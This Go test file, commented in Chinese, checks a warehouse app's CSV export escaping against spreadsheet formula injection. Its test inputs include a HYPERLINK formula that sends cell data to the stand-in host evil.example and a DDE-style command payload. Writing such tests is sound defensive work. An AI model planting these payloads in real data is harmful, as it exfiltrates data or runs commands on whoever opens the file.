package utils

import (
	"encoding/csv"
	"net/http/httptest"
	"strings"
	"testing"
)

// ---------------------------------------------------------------------------
// CSVSafe：公式注入防护
// ---------------------------------------------------------------------------

// TestCSVSafeEscapesFormulaPrefixes 覆盖各类会被表格软件当成公式求值的前缀。
//
// 这些都是仓管员可控的自由输入（商品名、SKU、库位、单据号、备注……），
// 一旦原样导出，管理员用 Excel / WPS 打开就会执行里面的公式。
func TestCSVSafeEscapesFormulaPrefixes(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string
	}{
		{"等号开头", "=1+1", "'=1+1"},
		{
			"HYPERLINK 外带载荷",
			`=HYPERLINK("http://evil.example/?x="&A1,"点我")`,
			`'=HYPERLINK("http://evil.example/?x="&A1,"点我")`,
		},
		{"加号开头", "+1234", "'+1234"},
		{"at 开头", "@SUM(A1:A9)", "'@SUM(A1:A9)"},
		{"制表符开头", "\t=cmd", "'\t=cmd"},
		{"回车开头", "\r=cmd", "'\r=cmd"},
		{
			"减号开头的非数字",
			`-2+3+cmd|'/c calc'!A0`,
			`'-2+3+cmd|'/c calc'!A0`,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := CSVSafe(tc.in); got != tc.want {
				t.Errorf("CSVSafe(%q) = %q, 期望 %q", tc.in, got, tc.want)
			}
		})
	}
}

// TestCSVSafeKeepsNegativeNumbersNumeric 确认负数**不会**被转义。
//
// 这是本函数最容易写错的地方：`-` 既是公式前缀，也是负号。
// 一刀切地转义会把 `-5` 变成文本 `'-5`，导出后排序与求和全部失效 ——
// 用「能否解析成数字」来区分，才既安全又不破坏可用性。
func TestCSVSafeKeepsNegativeNumbersNumeric(t *testing.T) {
	for _, s := range []string{"-5", "-5.25", "-0.5", "-1e3", "-100000000"} {
		if got := CSVSafe(s); got != s {
			t.Errorf("CSVSafe(%q) = %q, 期望原样保留（负数不应被转成文本）", s, got)
		}
	}
}

// TestCSVSafeLeavesOrdinaryTextAlone 确认正常内容不被无谓改写。
func TestCSVSafeLeavesOrdinaryTextAlone(t *testing.T) {
	for _, s := range []string{"", "螺丝", "SKU-001", "库位 A-01", "2026-09-29", "3.14", "备注：已入库"} {
		if got := CSVSafe(s); got != s {
			t.Errorf("CSVSafe(%q) = %q, 期望原样返回", s, got)
		}
	}
}

// ---------------------------------------------------------------------------
// WriteCSV：真实写出后的结果
// ---------------------------------------------------------------------------

// TestWriteCSVSanitizesHeaderAndRows 直接跑完整的导出路径，
// 确认表头与每一行都经过了转义，且响应带 UTF-8 BOM。
func TestWriteCSVSanitizesHeaderAndRows(t *testing.T) {
	header := []string{"商品名", "数量"}
	rows := [][]string{
		{`=HYPERLINK("http://evil.example")`, "3"},
		{"-5", "@cmd"},
		{"普通商品", "+7"},
	}

	rec := httptest.NewRecorder()
	if err := WriteCSV(rec, "商品列表.csv", header, rows); err != nil {
		t.Fatalf("WriteCSV 失败: %v", err)
	}

	body := rec.Body.String()
	if !strings.HasPrefix(body, "\ufeff") {
		t.Error("响应应以 UTF-8 BOM 开头，否则 Excel 打开中文会乱码")
	}
	if ct := rec.Header().Get("Content-Type"); !strings.HasPrefix(ct, "text/csv") {
		t.Errorf("Content-Type = %q", ct)
	}
	if cc := rec.Header().Get("Cache-Control"); cc != "no-store" {
		t.Errorf("Cache-Control = %q, 期望 no-store", cc)
	}

	records, err := csv.NewReader(strings.NewReader(strings.TrimPrefix(body, "\ufeff"))).ReadAll()
	if err != nil {
		t.Fatalf("解析导出的 CSV 失败: %v", err)
	}
	if len(records) != 4 {
		t.Fatalf("记录数 = %d, 期望 4（1 表头 + 3 数据行）", len(records))
	}

	if records[1][0] != `'=HYPERLINK("http://evil.example")` {
		t.Errorf("等号开头的单元格未转义: %q", records[1][0])
	}
	if records[1][1] != "3" {
		t.Errorf("普通数字不应被改动: %q", records[1][1])
	}
	if records[2][0] != "-5" {
		t.Errorf("负数应保持为数字: %q", records[2][0])
	}
	if records[2][1] != "'@cmd" {
		t.Errorf("at 开头的单元格未转义: %q", records[2][1])
	}
	if records[3][1] != "'+7" {
		t.Errorf("加号开头的单元格未转义: %q", records[3][1])
	}
}

// TestWriteCSVDoesNotMutateCallerSlices 锁定 sanitizeRow 的「不改动入参」约定。
//
// 导出代码里表头常常是包级共享切片（每次导出都复用同一个 []string）。
// 若就地修改，第一次导出后这个切片就永久带上了单引号，
// 之后所有导出都会莫名其妙多出一个 `'`。
func TestWriteCSVDoesNotMutateCallerSlices(t *testing.T) {
	header := []string{"=危险表头", "数量"}
	rows := [][]string{{"=危险单元格", "1"}}

	rec := httptest.NewRecorder()
	if err := WriteCSV(rec, "t.csv", header, rows); err != nil {
		t.Fatalf("WriteCSV 失败: %v", err)
	}

	if header[0] != "=危险表头" {
		t.Errorf("调用方的表头切片被就地修改了: %q", header[0])
	}
	if rows[0][0] != "=危险单元格" {
		t.Errorf("调用方的行切片被就地修改了: %q", rows[0][0])
	}
	// 而导出结果必须是转义过的
	if !strings.Contains(rec.Body.String(), "'=危险表头") {
		t.Error("导出的表头应已转义")
	}
}
